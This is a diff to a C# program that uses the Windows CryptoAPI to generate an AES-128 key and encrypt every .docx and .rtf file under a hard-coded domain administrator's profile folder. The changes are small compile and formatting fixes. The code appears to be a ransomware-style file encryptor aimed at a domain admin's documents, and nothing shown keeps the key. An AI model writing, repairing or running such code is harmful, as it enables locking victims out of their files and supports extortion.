@@ -37,12 +37,12 @@ namespace FileEncryption
             {
                 if (!CryptAcquireContext(out hProvider, null, "Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, 0))
                 {
-                    throw new CryptographicException(Marshal.GetLastWin32Error());
+                    throw new System.Security.Cryptography.CryptographicException(Marshal.GetLastWin32Error());
                 }
 
                 if (!CryptGenKey(hProvider, CALG_AES_128, CRYPT_EXPORTABLE, out hKey))
                 {
-                    throw new CryptographicException(Marshal.GetLastWin32Error());
+                    throw new System.Security.Cryptography.CryptographicException(Marshal.GetLastWin32Error());
                 }
 
                 string[] fileExtensions = { ".docx", ".rtf" };
@@ -94,23 +94,24 @@ namespace FileEncryption
             CryptEncrypt(hKey, IntPtr.Zero, true, 0, encryptedData, ref dataLength, dataLength);
 
             return encryptedData;
-}
-}
-public static class Program
-{
-    public static void Main()
-    {
-        string directoryPath = @"C:\Users\domain.admin";
-
-        try
-        {
-            FileEncryptor.EncryptFiles(directoryPath);
-            Console.WriteLine("Encryption complete.");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine("Encryption failed: " + ex.Message);
         }
     }
-}
+
+    public static class Program
+    {
+        public static void Main()
+        {
+            string directoryPath = @"C:\Users\domain.admin";
+
+            try
+            {
+                FileEncryptor.EncryptFiles(directoryPath);
+                Console.WriteLine("Encryption complete.");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Encryption failed: " + ex.Message);
+            }
+        }
+    }
 }
